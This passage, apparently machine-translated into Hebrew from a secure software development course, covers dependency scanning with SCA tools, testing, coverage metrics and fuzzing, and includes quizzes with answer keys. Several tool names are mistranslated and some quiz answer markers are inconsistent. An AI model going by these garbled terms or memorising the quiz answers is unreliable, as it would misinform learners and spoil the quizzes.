לכן, כל מה שכלי SCA צריך לעשות, בתיאוריה, הוא להבין אילו רכיבים (והגרסאות שלהם) קיימים, לחפש כל אחד מהם במסד נתונים אחד או יותר, ולדווח על התאמות. אפילו זיהוי הרכיבים לא תמיד קל; לעתים רכיבים שנעשה בהם שימוש חוזר אינם ברורים מאליהם (לדוגמה, מכיוון שהם הועתקו והודבקו, במקום להיות מטופלים כראוי באמצעות מנהל חבילות). עם זאת, באופן בסיסי עוד יותר, מסדי נתונים מתעדכנים כל הזמן כאשר מתגלות פגיעויות חדשות. משמעות הדבר היא שלתוכנה שנעשה בה שימוש חוזר, שלא היו לה פגיעויות ידועות קודם לכן, עשויה *להיות כעת פגיעות* ידועה. גם אם הפגיעות הייתה ידועה לציבור קודם לכן, ייתכן שעובדה זו לא הייתה מתועדת בגירסאות קודמות של מסדי הנתונים שבהם השתמש הכלי. לכן, כלים אלה חייבים לעבור שידור חוזר מעת לעת, או להפעיל את ההשוואות מחדש, כך שתהיו מודעים לפגיעויות חדשות שנמצאו.

אתה צריך להימנע מהתנהגות רעה כדי להפוך את הכלים האלה לשימושיים יותר. מפתחים מסוימים מעתיקים קוד שנעשה בו שימוש חוזר מחבילות אחרות ליישום שלהם, במקום להשתמש במנהל חבילות כדי להפוך את הזיהוי והעדכון של חבילות שנעשה בהן שימוש חוזר לאוטומטיים. גרוע מכך, מפתחים משנים לעתים *עותקים* אלה  ו/או מכניסים עותקים אלה (יצירת מזלג). חלק מכלי SCA יכולים למעשה לבחון קוד שורה אחר שורה, לזהות עותקים סבירים כאלה ולחבר אותם בחזרה למקורות שלהם (כדי לסייע בזיהוי פגיעויות). אבל כלי SCA כאלה הם מורכבים יותר, לעתים קרובות יקר לקנות ולהשתמש, וניסיון *לעדכן* את התוכנה הוא לעתים קרובות די קשה כי הכל נעשה באופן ידני. בנוסף, כלי SCA כאלה חייבים בהכרח להשתמש היוריסטיקות כדי לזהות מצבים כאלה, אשר עלול לפספס רכיבים כאלה בכל מקרה.

זה הרבה יותר טוב ליישם כמה שיטות עבודה טובות. ראשית, בעת שימוש חוזר בתוכנה, השתמש במנהל חבילות כדי לנהל אותה, כזה המתעד את מספרי הגירסאות הספציפיים בתבנית סטנדרטית שבאפשרותך להקליט במערכת בקרת הגירסאות שלך. על ידי שימוש בתבנית סטנדרטית, תוכל להשתמש בכלי SCA פשוטים בהרבה, והנתונים יהיו מדויקים יותר. באמצעות מנהל חבילות, באפשרותך לגרום באופן טריוויאלי לעדכון תוכנה ולבדוק שערכת הרכיבים החדשה פועלת.

אבל מי מחליט כמה מהר אתה צריך לעדכן את הרכיבים בשימוש חוזר שלך? זו שאלה מסובכת. אנשים מסוימים עשויים לומר, "מדיניות החברה שלי", "מנהל אבטחת המידע הראשי שלי" (CISO), "משרד המידע הראשי שלי" (CIO), או משהו כזה. כל התשובות האלה הן תשובות שגויות. אם המטרה שלך היא שתהיה לך מערכת מאובטחת, אז התשובה הנכונה היא שהתוקפים **__** *יחליטו מתי אתה צריך לעדכן*! הסיבה לכך היא שעליך לפרוס את הגירסה המעודכנת לפני שתוקף ינצל פגיעות זו במערכת שנפרסה.

מהירות חשובה כאשר לרכיב שאתה תלוי בו יש פגיעות ידועה לציבור, ואתה *יודע* שזה יקרה לפעמים. אז לנסות לטפל בזה באופן ידני לחלוטין זו טעות. במקום זאת, עליך לוודא כי:

1. יש לך לפחות כלי SCA אחד שמדווח לך באופן אוטומטי כאשר קיימת פגיעות ידועה ברכיב שבו המערכת שלך משתמשת.

2. באפשרותך לעדכן רכיב בקלות באמצעות פקודה פשוטה, בדרך כלל על-ידי מתן הוראה למנהל חבילות לעבור לגירסה אחרת של רכיב זה ובדיקת שינוי זה.

3. באפשרותך לבדוק באופן אוטומטי את התצורה ששונתה כדי לוודא שעדכון הרכיב אינו שובר שום דבר חשוב.

4. באפשרותך לפרוס אותה במהירות (אם אתה פורס ישירות) ו/או להפיץ אותה (אם אתה מפיץ את התוכנה לאחרים).

אם הבדיקות האוטומטיות שלך אינן טובות מספיק כדי להפוך את פריסת הרכיבים המעודכנים למקובלת, יש לך בעיית אבטחה חמורה. הצורך לעדכן רכיבים בשימוש חוזר הוא בלתי נמנע - לא רק אפשרות - ברוב התוכנות. אם הרכיבים שבהם אתה משתמש כל כך לא מעודכנים שאין באפשרותך לעדכן לגירסה נתמכת, גם זו בעיה רצינית... כי שוב, הצורך לעדכן רכיב עבור פגיעות הוא בדרך כלל בלתי נמנע.

כמו כל הכלים, SCAs נוטים לתוצאות חיוביות שגויות. בפרט, לרכיב עשויה להיות פגיעות, אך רק כאשר נעשה שימוש בשיטות מסוימות או רק בתצורות מסוימות. אם אינך משתמש ברכיב באופן שניתן לנצל את הפגיעות, כמובן שאינך צריך לעדכן את הרכיב. אבל זה קצת מטעה. לעתים קרובות קשה להיות *בטוח* שאינך צריך לבצע את העדכון. בנוסף, אם יש לך תהליך תקין שבו אתה יכול בקלות לעדכן רכיבים ― ואתה צריך ― אז זה לעתים קרובות לוקח יותר זמן כדי לקבוע (בוודאות) כי הפגיעות אינה ניתנת לניצול מאשר רק לבצע את העדכון. יתרה מכך, הזמן המושקע כדי להבין זאת עשוי לתת לתוקף זמן לנצל זאת אם מדובר בפגיעות אמיתית. אז לעתים קרובות עדיף פשוט לעדכן, גם אם זה לא בטוח להיות נצלני.

יש הרבה SCAs זמינים. אם אתה משתמש ב- GitHub או ב- GitLab, הם מספקים דיווח SCA בסיסי על פגיעויות ידועות ברכיבים רבים בחינם (בהנחה שאתה משתמש בתבנית ניהול חבילות סטנדרטית שהם יכולים לעבד). פרויקטים של קרן לינוקס יכולים להשתמש ב-LFx (לשעבר CommunityBridge) המספקת שירות זה. ישנם מגוון של ספקים המספקים או מוכרים כלים כאלה. זה כולל בדיקת תלות OWASP (שהיא OSS), מוצרי נקסוס של Sonatype, הברווז השחור של Synopsys, פתרונות תעלת יונים ו- Snyk. חלק ממנהלי החבילות כוללים יכולת זו או שיש להם תוסף עבורה (לדוגמה, **ל-bundler** של Ruby  יש **ביקורת צרורות**). זו בהחלט *לא* רשימה מלאה, ואין ספק שתרצו להשוות בין האפשרויות.

המפתח הוא שרוב התוכנות עושות שימוש חוזר בתוכנות אחרות, ושפגיעויות יימצאו מדי פעם בתוכנה שנעשה בה שימוש חוזר.

#### חידון 1.3: ניתוח הרכב תוכנה (SCA)/ניתוח תלות

\>\>בחר את כל המשפטים האמיתיים אודות טיפול ביחסי תלות:<<

[!x] ניתן להשתמש בכלים שיעזרו לך לזהות לאילו יחסי תלות של תוכנה יש פגיעויות הידועות לציבור.

[ ] ניתן להשתמש בכלי ניתוח הרכב תוכנה (SCA) כדי למצוא את כל יחסי התלות של התוכנה עם פגיעויות. {{ נבחר: לא, כלים כאלה מנסים לקבוע את יחסי התלות של התוכנה, ואז משווים את זה למסד הנתונים שלהם של פגיעויות ידועות. עם זאת, ייתכן שהם לא יזהו את כל יחסי התלות או שהפגיעות לא תהיה במסד הנתונים שלהם. ייתכן שהפגיעות אינה ידועה לציבור, וגם אם כן, אין ערובה לכך שמסד הנתונים של הכלים מכיל *את כל* הפגיעויות הידועות לציבור. }}

[ ] כדי לשמור על אבטחת התוכנה בפעולות, עדכן את הרכיבים הנמצאים בשימוש חוזר בפרק הזמן הנדרש על-ידי מדיניות החברה שלך. {{ נבחר: לא נכון, התוקף ** מחליט מתי עליך לעדכן. יש לפרוס את הגירסה המעודכנת לפני שתוקף תוקף את המערכת שפרסה באמצעות פגיעות זו. אם מדיניות החברה שלך אומרת שיש לך שבוע, והתוקף חותר תחת המערכת שלך תוך יום, המערכת שלך עדיין הייתה חתרנית. }}

[x] כדי לשמור על אבטחת התוכנה בפעולות, ודא שקיימים דוחות אוטומטיים של פגיעויות ידועות ביחסי התלות שלך, שבאפשרותך לעדכן בקלות יחסי תלות, שבאפשרותך לבדוק באופן אוטומטי את התצורה ששונתה ושבאפשרותך לפרוס או להפיץ במהירות בהתאם לצורך.

[ ] בדיקות אוטומטיות הן דבר נחמד, אך לא הכרחי לאבטחה, כאשר יש לך יחסי תלות. {{נבחר: False, מכיוון שעליך להיות מוכן לעדכון מהיר כאשר לתלות יש ניצול ידוע לציבור. ללא בדיקות אוטומטיות, אין זה מעשי לצבור במהירות מספיק ביטחון כדי לפרוס את העדכון בזמן. }}

## ניתוח דינמי

### סקירה כללית של ניתוח דינמי

ניתוח דינמי הוא כל גישה לאימות תוכנה (כולל איתור פגמים) על ידי הפעלת תוכנה על קלטים ספציפיים ובדיקת התוצאות. נבחן כמה סוגים של כלים שעושים זאת, אך ראשית, בואו נדון במגבלות שלהם.

#### מגבלות לניתוח דינמי

לכל כלי הניתוח הדינמי יש מגבלה בסיסית: אי אפשר להעריך את כל התשומות האפשריות בפרק זמן סביר. לא ניתן אפילו להעריך *תת-קבוצה סבירה*.

בואו נדמיין תוכנית טריוויאלית שמוסיפה שני מספרים שלמים של 64 סיביות. מספר הכניסות האפשריות הוא (2^64)\*(2^64) = 2^128. אם הרצנו בדיקות עם מעבד 4GHZ, ויכולנו להריץ ולבדוק כל קלט ב-5 מחזורים, נדרשות 13.5 x 10^21 שנים (13.5 שנות זטה) כדי לבדוק את התוכנית במלואה. שימוש במיליון מעבדים של 8 ליבות לא עוזר מספיק; זה יקטין את הזמן ל-1.7 x 10^15 שנים (כלומר, 1.7 שנים קוודריליון). לתוכניות אמיתיות יש תשומות הרבה יותר מורכבות מזה, כך שבדיקה אפילו של 0.00001% מכל התשומות של תוכניות אמיתיות היא בלתי אפשרית בחיי אדם.

כתוצאה מכך, כל גישות הניתוח הדינמי חייבות לנסות לבחור תת-קבוצה קטנה מאוד של קלטים אפשריים שעדיין יש להם סיכוי לזהות בעיות היכן שהן קיימות. לעתים קרובות הם יעילים מאוד. אבל גישות ניתוח דינמיות אינן יכולות "להוכיח" שמשהו עובד נכון באופן כללי; במקרה הטוב, יש להם סיכוי טוב לזהות בעיות.

#### בדיקות מסורתיות

גישת הניתוח הדינמי הידועה ביותר היא בדיקות מסורתיות. בחר קלטים ספציפיים לשליחה לתוכנית ובדוק אם התוצאה נכונה. באפשרותך לבדוק חלקים ספציפיים של תוכנית, כגון שיטה או פונקציה (פעולה זו נקראת *בדיקת יחידה*). ניתן גם לשלוח רצפים של כניסות למערכת המשולבת בכללותה (*בדיקת אינטגרציה*). רוב האנשים משלבים בדיקות יחידה ואינטגרציה. בדיקות יחידה הן מהירות ויכולות להיות קלות לבדוק מקרים מיוחדים רבים, אך בדיקות יחידה מפספסות לעתים קרובות בעיות במערכת שלמה שבדיקות אינטגרציה נוטות הרבה יותר לזהות. מכיוון שמחשבים מהירים בהרבה מכפי שהיו לפני עשרות שנים, לעתים קרובות עדיף להתמקד בבדיקות אינטגרציה על פני בדיקות יחידה, אך לשתי הגישות יש את מקומן. ספרות הבדיקות מתארת סוגים אחרים של בדיקות, אך לענייננו, שתי הגישות הללו מספיקות כדי להבין את הבעיות.

אם התוכנה שלך צריכה לעבוד כראוי, חשוב מאוד שתהיה לך חבילת בדיקות טובה של *בדיקות אוטומטיות* ותיישם את חבילת הבדיקות בצינור האינטגרציה הרציף שלך. בטוב ** אנו מתכוונים "סביר יחסית לזהות בעיות חמורות בתוכנה". אמנם זה לא מבטיח שאין שגיאות, אבל חבילת בדיקות טובה מגדילה מאוד את ההסתברות לזיהוי, והיא חשובה במיוחד לאיתור בעיות בעת שדרוג רכיב שנעשה בו שימוש חוזר.

אם אתה מספק תוכנה, ופגם נמצא מאוחר יותר ותוקן, עבור כל תיקון עליך לחשוב על הוספת בדיקה נוספת למצב זה. לעתים קרובות, פגמים הבורחים לשדה מצביעים על סוג של טעות עדינה שעלולה לחזור על עצמה בגרסה עתידית של המערכת. במקרה כזה, הוסף בדיקות כך שאם בעיה זו חוזרת על עצמה, יזוהו *לפני* שחרור גירסה אחרת.

אם אתה מתקשר עם מישהו אחר שיכתוב (חלק) מהתוכנה שלך, ואינך רוצה להיות נשלט על ידו מאוחר יותר, עליך לוודא שאתה לא רק מקבל את קוד המקור של היישום (ואת הזכויות לשנות אותו עוד יותר), אלא גם לקבל את כל הוראות הבנייה והבדיקות הדרושות כדי להיות מסוגל לשנות את התוכנה בבטחה. אחרי הכל, אם אתה לא יכול בקלות לבנות או לבדוק שינוי תוכנה, אין דרך בטוחה לבצע שינויים ולשלוח אותו.

בתיאוריה, אתה יכול ליצור בדיקות ידניות, כלומר, לכתוב הליך ידני מפורט שלב אחר שלב ויש לי אדם בצע את שלבי הבדיקה האלה. בפועל, בדיקות ידניות הן כמעט תמיד "בדיקות שלא יבוצעו" בגלל העלויות הגבוהות והעיכובים שלהן. בעיה נוספת עם בדיקות ידניות היא שזה *מרתיע* בדיקות מתמשכות, שכן זה עולה זמן וכסף לעשות את הבדיקות הידניות האלה. לכן הימנעו מבדיקות ידניות לטובת בדיקות אוטומטיות היכן שהן מעשיות. במקרים מסוימים ייתכן שיהיה עליך לבצע בדיקה ידנית, אך זכור שכל בדיקה ידנית היא בדיקה שלעיתים רחוקות (אם בכלל) תיעשה, מה שהופך את הבדיקה להרבה פחות שימושית. שים לב שמה שאנו מתארים כבדיקות *ידניות* שונה מניתוח *ידני לא מכוון* (שבו בני אדם משתמשים בתוכנה *ללא* תהליך שלב אחר שלב). ניתוח ידני לא מכוון יכול להיות יעיל למדי, אך הוא שונה לחלוטין מבדיקות ידניות כפי שהגדרנו אותן כאן.

בעיה מסובכת בבדיקה היא כאשר משאב אינו זמין. אם הבדיקה דורשת תוכנה, חומרה או נתונים שאינם ברשותך, לא תוכל לבדוק אותה ישירות. בדרך כלל, הדבר הטוב ביותר שניתן לעשות במקרים אלה הוא לדמות אותו (לדוגמה, עם תוכנה נלעגת, חומרה מדומה או מערך נתונים עומד). אם זה הכי טוב שאתה יכול לעשות, זה בדרך כלל כדאי. אבל אל תבלבלו בין הסימולציה למציאות; תוצאות הבדיקה עשויות להיות מטעות בשל הבדלים בין המשאב בפועל לבין עמידתו.

#### בדיקות מסורתיות לאבטחה

מנקודת מבט ביטחונית, חשוב לכלול בדיקות לדרישות אבטחה. בפרט, לבדוק הן "מה צריך לקרות" ו "מה לא צריך לקרות". לעתים קרובות אנשים שוכחים לבדוק *מה לא צריך לקרות* (aka בדיקה שלילית). לדוגמה, כאשר זה חל, אתה צריך בדיקה כדי לבדוק "האם אני יכול לקרוא / לכתוב *מבלי* להיות מורשה לעשות זאת?" (התשובה צריכה להיות "לא") ו"האם אוכל לגשת למערכת עם  אישור *לא חוקי* או ללא אישור כלל?" (שוב, זה צריך להיכשל). זה נפוץ מאוד עבור אבטחה של תוכניות להיכשל כי הם לא בודקים כראוי אימות (2017 OWASP Top 10 #2) או הרשאה (2017 OWASP Top 10 #5), אז ודא שיש לך בדיקות עבור זה!

גישה אחת לפיתוח תוכנה נקראת *פיתוח מונחה בדיקות* (TDD). לסיכום יתר, ב- TDD המבחנים ליכולת חדשה נכתבים לפני התוכנה כדי ליישם את היכולת. יש לזה כמה יתרונות, בפרט, זה מעודד כתיבת מבחנים שימושיים שבאמת בודקים מה הם אמורים לבדוק, וזה גם מעודד פיתוח תוכנה הניתנת לבדיקה. אחת הבעיות האפשריות עם TDD היא שמתרגלי TDD רבים נכשלים בכתיבת ** בדיקות שליליות. חלק מהנחיות TDD אפילו טוענות שצריך לכתוב רק בדיקות ליכולת החדשה ולא לשום דבר אחר. זו הדרכה נוראית, כי לפעמים יש דברים שפשוט לא ** צריך  לתת להם לקרות, ואתה עדיין צריך לבדוק אותם. אתה בהחלט יכול לכתוב תוכנה מאובטחת באמצעות TDD, אבל אתה חייב לכלול בדיקות שליליות (בדיקות עבור מה שאסור לתוכנה ** לעשות) אם אתה מחיל TDD.

 2021 OWASP Top 10 #7 הוא *כשלי זיהוי ואימות*. אימות לקוי הוא טעות נפוצה כל כך *שאימות שבור* הוא 2017 OWASP Top 10 #2, 2021 CWE Top 25 #14, ו- 2019 CWE Top 25 #13. זה [CWE-287](https://cwe.mitre.org/data/definitions/287.html), *אימות לא תקין*. * אימות חסר עבור (במיוחד א) פונקציה קריטית הוא 2021 CWE Top 25 #*11 ו- 2019 CWE Top 25 #36 (CWE-306[](https://cwe.mitre.org/data/definitions/306.html)). * בקרת גישה שבורה* (כולל כשלים בהרשאה) היא 2017 OWASP Top 10 #5.

#### כיסוי בדיקה

אתה *תמיד* יכול  לכתוב עוד מבחן; איך תדעו מתי כתבתם מספיק בדיקות? לוקח זמן ליצור ולתחזק בדיקות, ויש להוסיף בדיקות רק אם הן מוסיפות ערך. זו מתבררת כשאלה קשה, והרבה תלוי עד כמה התוכנה שלך קריטית.

שתי מדידות פשוטות שיכולות לעזור לך לענות על שאלה זו הן *כיסוי הצהרה* וכיסוי *ענף*:

1. כיסוי הצהרות הוא אחוז הצהרות התוכנית שהופעלו על ידי בדיקה אחת לפחות.

2. כיסוי סניפים הוא אחוז הענפים שנלקחו במבחן אחד לפחות. במבנה **אם-אז-אחר**,  החלק **אז** הוא  ענף אחד והחלק **** השני  הוא הענף השני. בלולאה, *הריצה* חלק הגוף הוא  ענף אחד ואל *תריץ הגוף* הוא הענף השני. במשפט מתג (מקרה), כל אפשרות היא ענף.

כיסוי הצהרה וכיסוי ענף משלבים ניתוח דינמי (תוצאות בדיקה) עם ניתוח סטטי (מידע על הקוד), ולכן הוא נחשב לעתים לגישה היברידית ** . אבל לא משנה איך תקראו לזה, המדידות האלה כן מספקות קצת מידע על מידת הבדיקות של תוכנית.

אחת הבעיות האפשריות עם כיסוי הצהרות וסיקור סניפים היא שחלק מההצהרות והענפים עשויים להיות בלתי נגישים ממגוון סיבות. אם לא ניתן להגיע להצהרה, ייתכן שתרצה להוסיף את המקבילה של "**לטעון (לא נכון)"** כדי ליידע כלים ובני אדם כי הצהרה זו לעולם לא צריך להיות מושגת. מה שאתה באמת רוצה לדעת הוא אחוז הענפים *וההצהרות האפשריות* שכוסו על ידי בדיקות.

ככלל אצבע, אנו מאמינים שחבילת בדיקות אוטומטית עם פחות מ-90% כיסוי הצהרות או פחות מ-80% כיסוי סניפים (על פני כל הבדיקות האוטומטיות) היא חבילת בדיקות גרועה. אבל זה רק כלל אצבע. חלק מהמומחים חושבים שיש לצפות למספרים גדולים יותר (יש הטוענים שכל דבר פחות מ -100% מההצהרות והענפים האפשריים אינו מקובל). כל שאר הדברים שווים, מספרים גדולים יותר הם טובים, אבל לעתים קרובות הרבה יותר יקר להשיג את האחוזים האחרונים, ואם זה שווה את זה או לא תלוי עד כמה התוכנה חשובה. במקרים רבים לא ניתן לבצע הצהרות או הסתעפויות מסוימות, וייתכן שלא תהיה דרך לציין זאת בפני כלי המדידה.

אמצעי כיסוי בדיקה אלה מזהירים אותך מפני הצהרות וענפים שאינם נבדקים, ומידע זה יכול להיות בעל ערך רב. מנקודת מבט ביטחונית, אמצעי כיסוי מזהירים אותך מפני הצהרות או ענפים שאינם מופעלים בבדיקות, מה שמרמז על כך שחסרות כמה בדיקות חשובות או שהתוכנה אינה פועלת כראוי. אל תסתפקו בהוספת בדיקה; ודא שאתה מבין *מדוע* משהו לא מכוסה.

לדוגמה, הזכרנו קודם לכן פגיעות מסוכנת בגרסאות רבות של מערכות ההפעלה של אפל, שנקראו באופן רשמי CVE-2014-1266 וכונו באופן לא רשמי "goto fail; goto fail;" פגיעות. הבעיה הייתה שבשל  הצהרת **goto** כפולה  , דילג על קוד כלשהו החיוני לבדיקת אישורי אבטחה. אמצעי כיסוי הצהרה היה מזהה באופן טריוויאלי שקוד קריטי לאבטחה זה אינו מופעל על ידי שום בדיקה, וזה היה צריך להיות מספיק אזהרה כדי לבדוק את הבעיה.

בעיה גדולה עם אמצעי הצהרה וכיסוי סניפים היא שהם יכולים להזהיר אתכם מפני כמה חבילות בדיקה אוטומטיות גרועות, אבל חבילת בדיקות גרועה עדיין יכולה לקבל ציונים מושלמים ב-100%. לדוגמה, חבילת מבחנים עשויה להפעיל את כל הענפים וההצהרות, אך לא לבדוק אם אחת מהתשובות הייתה נכונה. חבילת הבדיקות הזו תהיה בעלת כיסוי של 100% סניפים והצהרות, וגם תהיה חבילת בדיקות גרועה. בנוסף, בעוד שהם יכולים לספר לך אם קוד קיים נבדק או לא, הם לא יכולים לזהות קוד *חסר* . לדוגמה, אם יש מקרה מיוחד שזקוק לטיפול מיוחד, אך שום דבר לא בודק את המקרה המיוחד הזה, בדרך כלל אמצעי כיסוי אלה אינם יכולים לזהות זאת.

בקיצור: אמצעי כיסוי אלה יכולים להיות שימושיים לאזהרה על כמה בעיות, אבל הם לא מזהירים על כל בעיות הבדיקה.

אבל יש יותר לניתוח דינמי כאשר אתה מעוניין באבטחה. בואו נסתכל הבא על בדיקות fuzz.

#### חידון 1.4: סקירה כללית של ניתוח דינמי

\>\>בחר את המשפטים האמיתיים אודות ניתוח דינמי כולל בדיקה:<<

[!] עבור תוכנה באיכות גבוהה, ודא שהתוכנה נבדקת עם כל ערכי הקלט האפשריים. {{ נבחר: זה לגמרי בלתי אפשרי. אנחנו אפילו לא יכולים לעשות את זה עבור תוכנה שרק מוסיפה שני מספרים של 64 סיביות, לעולם לא לחשוב על תוכנת "העולם האמיתי". }}

[x] בדיקות יחידה מפספסות לעתים קרובות בעיות של מערכת שלמה שבדיקות אינטגרציה נוטות הרבה יותר לזהות.

[ ] כיסוי הצהרה מודד את אחוז הענפים שבוצעו על ידי קבוצה כלשהי של בדיקות. {{ נבחר: לא. כיסוי סניפים מודד סניפים, כיסויי הצהרות מודד הצהרות. }}

[ ] כל בדיקת אבטחה צריכה לוודא שהמערכת מבצעת פעולה כאשר היא כבר הוסמכה לעשות זאת. {{ נבחר: לא, אם כי זו שאלה ערמומית. כנראה שחשוב יותר לאבטחה לכתוב בדיקות כדי לבדוק שהמערכת אינה מבצעת פעולות שונות כאשר היא אינה מורשית לעשות זאת. בדיקות מסוג זה, כדי להבטיח שמשהו לא נעשה כאשר הוא לא אמור להיעשות, נקראות לפעמים "בדיקה שלילית". חשוב מאוד, למען הביטחון, שהבדיקות השליליות הללו יהיו חלק מחבילת הבדיקות האוטומטית שלכם. }}

[x] אם הצהרות אינן מופעלות על ידי חבילת הבדיקה שלך, עליך לחקור כדי לקבוע מדוע, במיוחד אם הן חשובות לאבטחה.

[x] באופן כללי, כיסוי הצהרה וסניף אינם יכולים לזהות קוד חסר, הם יכולים לדווח רק על אחוז  הקוד *הקיים* (לפי מדד כלשהו) שנבדק.

### בדיקת Fuzz

בדיקת Fuzz היא סוג אחר של ניתוח דינמי.

#### מטושטש לעומת בדיקות מסורתיות

בבדיקות מטושטשות, אתה יוצר מספר רב של  כניסות *אקראיות*,  מפעיל את התוכנית ורואה אם התוכנית מתנהגת בצורה גרועה (למשל, קריסות או נתקעות). היבט מרכזי של fuzzing הוא  כי זה *בדרך כלל לא* לבדוק אם התוכנית מייצרת את התשובה הנכונה; זה רק בודק כי התנהגות סבירה מסוימת (כמו "לא לקרוס") מתרחשת.

זה לעתים קרובות הרבה עבודה כדי ליצור בדיקות מסורתיות, בין השאר כי אתה צריך לדעת מה תהיה התוצאה הנכונה. Fuzzing מוותר על כך, מה שמקל על שליחת קלטים רבים יותר באופן אוטומטי לתוכנית, אך מוותר על היכולת לזהות סוגים מסוימים של שגיאות. כמו מחשבים הפכו מהר יותר וזול יותר, fuzzing הפך מאוד שימושי, כי ניתן להפעיל מחשבים רבים במשך תקופה ארוכה של זמן כדי לנסות קלט רבים. Fuzzing יכול להיות יעיל במיוחד בזיהוי שגיאות בטיחות זיכרון (שהן נפוצות ומסוכנות) וביצירת קלטים מוזרים המדגישים את מאמתי הקלט. Fuzzing אינו מחליף את הבדיקות המסורתיות, אך הוא יכול להיות השלמה מצוינת לבדיקות מסורתיות.

יש הרבה פוזרים, והרבה מחקר התמקד בשיפורם. מבחינה היסטורית פוזרים הפעילו קלט אקראי באמת. כיום משתמשים בהיוריסטיקות, מודלים של פרוטוקולים ו/או מידע אחר כדי ליצור את הקלט של התוכנה הנבדקת (SUT) המכונה יעד ההערכה (TOE) המכונה היעד. חלק מהפאזרים גם הגדילו את הדרכים שבהן הם יכולים לזהות בעיה, לא רק על ידי זיהוי קריסה. שינויים אלה מגדילים את הסבירות למציאת פגם (כולל פגיעות).

#### שימוש יעיל בפאזלים

Fuzzers יכול להיות שימושי מאוד למציאת נקודות תורפה. אם אתה משתמש באחד מהם, לעתים קרובות כדאי להוסיף ולהפעיל קביעות תוכנית. זה הופך בעיות מצב פנימיות - אשר לא יכול להיות מזוהה על ידי fuzzer - להתרסקות, אשר fuzzer יכול לזהות בקלות. אם אתה מפעיל תוכנית C/C++ , עליך לשקול להפעיל fuzzer בשילוב עם חומר חיטוי כתובות (ASAN) - ASAN יהפוך כמה בעיות גישה לזיכרון שבדרך כלל מתרחשות בשקט לקריסה, ושוב, טרנספורמציה זו משפרת את יכולתו של ה-fuzzer לזהות בעיות.

גם דפדפני האינטרנט Firefox וגם Chromium משתמשים בפוזות, בשילוב עם ASAN, כדי לנסות לזהות פגיעויות לפני שחרור גרסאות חדשות.

אם התוכנית שלך מבצעת בדיקות על קלט כמו בדיקת צ'קים או כותרות CRC (בדיקת יתירות מחזורית), סביר להניח שבקרוב תצטרך להשבית בדיקות אלה או ליישם מחדש באופן מיוחד ערכים אלה בעת שימוש במטושטש. בכל אופן השתמש ב- fuzzer על התוכנה ללא שינוי תחילה, אך הבעיה היא שה- fuzzer בסופו של דבר יבדוק בעיקר את קוד בדיקת הכותרת checksum / CRC שוב ושוב, ולא את שאר הקוד. חלק מהפאזרים מותאמים ליצירת קלטים מעוצבים היטב שיעברו בדיקות כגון CRC ולאחר מכן ינסו למצוא שגיאות עמוק יותר בתוכנית הנבדקת.

פאזרים רבים מבוססים *על מוטציות* - כלומר, הם מתחילים עם קבוצה התחלתית של קלטים לדוגמה (הנקראים "זרעים"), ולאחר מכן מוטציות חוזרות ונשנות של קלטים קודמים כדי ליצור קלטי בדיקה חדשים. היעילות של תנורים מבוססי מוטציה תלויה מאוד בזרעים שנבחרו. כלל אצבע שימושי ליצירת זרעים הוא לנסות לבחור קבוצה מינימלית של תשומות הדרושות כדי לכסות (או כמעט לכסות) את הקוד (כלומר, כדי להשיג כיסוי הצהרה של 100%). למידע נוסף, ראה [*מיטוב בחירת זרעים עבור Fuzzing*](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf), 2014. אם מדובר בזרעים רבים מדי, בחר זרעים כדי לכסות כמה שיותר מהקוד עם מספר זרעים זה (כך שכל זרע יהיה שונה באופן משמעותי).

#### פוזרים מונחי כיסוי

תת-מחלקה חשובה של fuzzer היא fuzzer *מונחה כיסוי*. מכשירי fuzzer אלה מכשירים את התוכנה הנבדקת (SUT, התוכנה הנבדקת) כך שה- fuzzer מקבל מידע על איזה קוד מכוסה כאשר כל קלט מבוצע (כולל, במקרים רבים, באיזו תדירות חלקים שונים של הקוד מופעלים). מידע זה משמש לאחר מכן כדי לקבוע את הקלטים הבאים שייווצרו. הכלי האמריקאי Fuzzy Lop (AFL) הדגים את כוחה של טכניקה זו; הוא משתמש לא רק אילו חלקים של הקוד מבוצעים, אלא כמה פעמים, ומעדיף ליצור קלטים חדשים בדומה לתשומות קודמות שגרמו לספירה חדשה. כלים אחרים כגון libFuzzer גם להשתמש בגישה זו. פאזרים אלה נקראים גם *fuzzers מבוססי משוב * או * כלי בדיקת אבטחת יישומים מבוסס משוב* (FAST  ) ([*מה זה FAST?*](https://blog.code-intelligence.com/what-is-fast) מאת סרגיי דצ'אנד, 2020)., גישה זו משלבת ניתוח סטטי ודינמי, כך שכלים אלה יכולים להיחשב ככלי ניתוח היברידיים.

#### ירידה בשיעור התשואה

אתגר עם fuzzers הוא שעם הזמן יש להם בדרך כלל שיעור תשואה פוחת. כלומר, לעתים קרובות הם מצליחים למצוא פגיעויות בתוכניות שמעולם לא היו מטושטשות לפני כן, אך זה יכול לקחת במהירות זמן אקספוננציאלי (או לעולם לא) כדי למצוא את הפגיעות הבאה לאחר שהבעיות שזוהו בעבר תוקנו. זה יכול גם לדרוש משאבים; fuzzing עשוי להימשך ימים, שבועות או אפילו יותר של ביצוע רציף במספר מערכות מקבילות לפני ש-fuzzing יכול למצוא משהו. זה לא אומר fuzzers הם חסרי תועלת - הם יכולים להיות מאוד שימושי - אבל שוב, הם רק חלק מחבילת כלים כדי להפוך את התוכנה מאובטחת.

#### פרויקטים מטושטשים

אם אתה מנהל פרויקט OSS, ייתכן שתשקול להשתתף בפרויקט [OSS-Fuzz של Google](https://github.com/google/oss-fuzz). OSS-Fuzz מיישם fuzzing בשילוב עם חומרי חיטוי שונים כדי לנסות לזהות פגיעויות. [פרויקט Fuzzing](https://fuzzing-project.org/) מעודד/מתאם החלת בדיקות fuzz על OSS.

#### סורקי Fuzzing ויישומי אינטרנט

יש מספר עצום של fuzzers, ודברים משתנים כל הזמן. הצעד הראשון הוא לדעת שיש כלי שעשוי להיות שימושי. עם זאת, אם מה שפיתחת הוא יישום אינטרנט, יש כלי שתוכנן במיוחד עבור מצב זה שבדרך כלל מטמיע בתוכו מטושטש, הנקרא *סורק יישומי אינטרנט*. נדון בכך ביחידה הבאה.

#### חידון 1.5: בדיקת Fuzz

\>\>בחר את המשפטים האמיתיים אודות fuzzing:<<

[!] Fuzzers שולחים קלט לתוכנית וקובעים אם הפלט נכון.

[x] Fuzzer מונחה כיסוי או מבוסס משוב משתמש במידע על איזה קוד מכוסה על ידי ביצוע קלט בעבר כדי לקבוע אילו קלטים ליצור בהמשך.

